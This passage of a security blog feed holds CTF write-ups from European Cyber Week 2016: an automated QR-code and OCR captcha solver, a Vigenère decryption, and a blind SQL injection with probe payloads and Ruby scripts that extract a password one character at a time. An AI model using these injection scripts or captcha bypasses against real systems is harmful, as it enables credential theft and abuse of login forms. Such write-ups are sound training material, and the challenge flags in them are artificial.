<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span> <span class="comment"># to decode base64 images</span></div><div class="line"><span class="keyword">require</span> <span class="string">'zxing'</span> <span class="comment"># to solve qr code</span></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line"><span class="comment">### Crawling the website to get the base64 QRCode ###</span></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/divers200'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform</div><div class="line"><span class="comment">#puts c.body_str</span></div><div class="line"></div><div class="line"><span class="comment">### Parse the output ###</span></div><div class="line">qrcode_b64 = c.body_str.match(<span class="regexp">/QRCode" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = c.body_str.match(<span class="regexp">/Captcha" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : base64 to png ###</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Captcha : base64 to png ###</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : png to text string ###</span></div><div class="line">qrcode_answer = ZXing.decode qrcode_file</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line"></div><div class="line"><span class="comment">### Captcha : png to text string ###</span></div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line"><span class="comment">### Send the answer ###</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line">c.http_post(Curl::PostField.content(<span class="string">'captcha'</span>, captcha_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'qrcode'</span>, qrcode_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">c.perform</div><div class="line">puts c.body_str.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="comment"># Redo the whole process one more time</span></div><div class="line">qrcode_b64 = c.body_str.match(<span class="regexp">/QRCode Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = c.body_str.match(<span class="regexp">/Captcha Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">qrcode_answer = ZXing.decode qrcode_file</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line">c.http_post(Curl::PostField.content(<span class="string">'captcha'</span>, captcha_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'qrcode'</span>, qrcode_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">c.perform</div><div class="line">puts c.body_str.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line">puts <span class="string">"Flag : "</span> + captcha_answer + qrcode_answer</div><div class="line"></div><div class="line"><span class="comment">### Wait for avoiding Jruby to crash ###</span></div><div class="line">sleep(<span class="number">0</span>.<span class="number">5</span>)</div><div class="line"></div><div class="line"><span class="comment">### Remove temporary file ###</span></div><div class="line">File.delete(qrcode_file)</div><div class="line">File.delete(captcha_file)</div><div class="line">File.delete(<span class="string">"output.gif"</span>)</div></pre></td></tr></table></figure>
<p>Script is working but <code>curb</code> is not very quick and the <code>ZXing</code> ruby gem is just a port of the java version of <code>ZXing</code> with Jruby and is amazingly slow and buggy! So the whole script process take 9 seconds. That’s too slow!</p>
<p>Let’s try to optimize the execution speed with more quicker tools:</p>
<ul>
<li>replace <code>curb</code> gem using libcurb directly with <code>curl</code></li>
<li>replace <code>ZXing</code> with a custom script using <code>PIl</code> and <code>pytesseract</code></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span> <span class="comment"># to decode base64 images</span></div><div class="line"></div><div class="line"><span class="comment">### Crawling the website to get the base64 QRCode ###</span></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/divers200'</span></div><div class="line"></div><div class="line">cookies = <span class="string">'session=mySessionCookie'</span></div><div class="line">body_str = <span class="string">`curl https://challenge-ecw.fr/chals/divers200 --cookie '<span class="subst">#&#123;cookies&#125;</span>'`</span></div><div class="line"></div><div class="line"><span class="comment">### Parse the output ###</span></div><div class="line">qrcode_b64 = body_str.match(<span class="regexp">/QRCode" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = body_str.match(<span class="regexp">/Captcha" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : base64 to png ###</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Captcha : base64 to png ###</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : png to text string ###</span></div><div class="line">qrcode_answer = <span class="string">`python2 myQRCodeSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line"></div><div class="line"><span class="comment">### Captcha : png to text string ###</span></div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">### Send the answer ###</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line">server_answer = <span class="string">`curl https://challenge-ecw.fr/chals/divers200 --cookie '<span class="subst">#&#123;cookies&#125;</span>' -X POST -F "captcha=<span class="subst">#&#123;captcha_answer&#125;</span>" -F "qrcode=<span class="subst">#&#123;qrcode_answer&#125;</span>" -F "nonce=<span class="subst">#&#123;nonce&#125;</span>"`</span></div><div class="line">puts <span class="string">'&gt;&gt;&gt; '</span> + server_answer.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="comment"># Redo the whole process one more time</span></div><div class="line">qrcode_b64 = server_answer.match(<span class="regexp">/QRCode Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = server_answer.match(<span class="regexp">/Captcha Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line">qrcode_answer = <span class="string">`python2 myQRCodeSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line">puts <span class="string">"Flag : "</span> + captcha_answer + qrcode_answer</div><div class="line"></div><div class="line"><span class="comment">### Remove temporary file ###</span></div><div class="line">File.delete(qrcode_file)</div><div class="line">File.delete(captcha_file)</div><div class="line">File.delete(<span class="string">"output.gif"</span>)</div></pre></td></tr></table></figure>
<p>Here is my custom captcha solver <code>myCaptchaSolver.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> pytesseract <span class="keyword">import</span> image_to_string</div><div class="line"></div><div class="line">im = Image.open(<span class="string">"captcha.png"</span>)</div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line">im2 = Image.new(<span class="string">"P"</span>,im.size,<span class="number">255</span>)</div><div class="line"></div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line"></div><div class="line">temp = &#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(im.size[<span class="number">1</span>]):</div><div class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> range(im.size[<span class="number">0</span>]):</div><div class="line">    pix = im.getpixel((y,x))</div><div class="line">    temp[pix] = pix</div><div class="line">    <span class="keyword">if</span> pix == <span class="number">1</span>: <span class="comment"># these are the numbers to get</span></div><div class="line">      im2.putpixel((y,x),<span class="number">0</span>)</div><div class="line"></div><div class="line">im2.save(<span class="string">"output.gif"</span>)</div><div class="line"></div><div class="line"></div><div class="line">im2.load()</div><div class="line"><span class="keyword">print</span> (image_to_string(im2))</div></pre></td></tr></table></figure>
<p>Here is my custom QR code solver <code>myQRCodeSolver.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> qrtools</div><div class="line">qr = qrtools.QR()</div><div class="line">qr.decode(<span class="string">"qrcode.png"</span>)</div><div class="line"><span class="keyword">print</span> qr.data</div></pre></td></tr></table></figure>
<p>Flag: <code>ECW{20cbf8e17eb7e62936e3602b498776e6}</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>ECW - 50 - Ave, César! - Cryptography</title>
    <link href="http://rawsec.ml/en/ECW-2016-ave-cesar/"/>
    <id>http://rawsec.ml/en/ECW-2016-ave-cesar/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-07T21:44:48.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This was not Caesar as title suggested but Vigenere code, a troll I guess…</p>
<p>With some frequency analysis and bruteforce we found:</p>
<ul>
<li>The key was: <code>contest</code>.</li>
<li>And the message was: <code>remporte cette epreuve grace au flag ecw accolade ouvrante d huit c trois un cinq cinq c huit six a six eef un huit db huit quatre cinq trois un sept b huit b cinq a sept deux accolade fermante. les chiffres et caracteres speciaux ont ete remplaces par leur nom textuel.</code>.</li>
<li>That gave us the flag: <code>ECW{d8c3155c86a6eef18db845317b8b5a72}</code>.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ECW - 50 - Authentification - Web</title>
    <link href="http://rawsec.ml/en/ECW-2016-authentification/"/>
    <id>http://rawsec.ml/en/ECW-2016-authentification/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-07T21:45:01.537Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection" target="_blank" rel="external">bling SQL injection</a> and Out-Of-Band (OOB) channel exfiltration is not working.<br>When giving a correct (well formed) SQLi we get the message: <code>Authentification valide. Le mot de passe est le flag.</code>.<br>So we are able to determine if a request is true or false.<br>So the following requests gave us some details about the DB:</p>
<ul>
<li><code>&#39; or 1=1 #</code> =&gt; MySQL Database</li>
<li><code>&#39; or substring(version(),1,1)=5 #</code> =&gt; MySQL 5</li>
<li><code>&#39; or (select 1)=1 #</code> =&gt; subselect supported</li>
<li><code>&#39; or (select substring(concat(1,password),1,1) limit 0,1)=1 #</code> =&gt; column name is <em>password</em></li>
</ul>
<p>So our payload will be <code>SELECT password</code>.</p>
<p>And here is the script I wrote :</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line"><span class="comment"># Find the length of the password</span></div><div class="line">length = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></div><div class="line">  c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR LENGTH((<span class="subst">#&#123;payload&#125;</span>))=<span class="subst">#&#123;length&#125;</span> #"</span>),</div><div class="line">              Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">  c.perform</div><div class="line">  <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">    puts <span class="string">"Length: <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    <span class="keyword">break</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    puts <span class="string">"Length: not <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    length+=<span class="number">1</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  (<span class="number">32</span>..<span class="number">126</span>).each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char.chr)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char.chr&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<p>We can optimize the time to get the password because we know that the flag is <code>ECW{md5(string)}</code> and md5 hashes contains only lower letters and digits that is 32 chars long. So we can fix some parameters:</p>
<ul>
<li>Lenght of the password: <strong>37</strong></li>
<li>Alphabet: <strong>[“a”, “b”, “c”, “d”, “e”, “f”, “0”, “1”, “2”, “3”, “4”, “5”, “6”, “7”, “8”, “9”, “E”, “C”, “W”, “{“, “}”]</strong></li>
</ul>
<p>That give us the more optimized script:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line">length = <span class="number">37</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a + [<span class="string">'E'</span>, <span class="string">'C'</span>, <span class="string">'W'</span>, <span class="string">'&#123;'</span>, <span class="string">'&#125;'</span>]</div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char.ord&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
